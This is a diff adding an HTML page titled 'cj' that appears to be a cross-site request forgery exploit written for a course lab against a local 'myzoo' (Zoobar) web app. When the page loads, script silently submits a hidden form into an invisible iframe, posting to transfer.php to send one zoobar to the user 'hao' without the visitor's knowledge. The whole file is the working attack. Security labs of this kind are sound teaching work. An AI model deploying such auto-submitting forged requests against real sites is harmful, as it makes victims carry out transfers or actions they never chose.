@@ -1,0 +1,18 @@
+<html>
+<head>
+<title>cj</title>
+</head>
+<style>
+</style>
+     <body>
+          <iframe id="myiframe" width=600px height=400px name="iframe1" frameborder="0" scrolling=no></iframe>
+	  <form method=POST name=form id=transferform target="iframe1" action="http://127.0.0.1/myzoo/transfer.php">
+	  	<input name=zoobars type=hidden value="1">
+          	<input name=recipient type=hidden value="hao">
+                <input type=hidden name=submission value="Send">
+	  </form>
+	  <script>
+		  document.getElementById("transferform").submit();
+	  </script>
+     </body>
+</html>
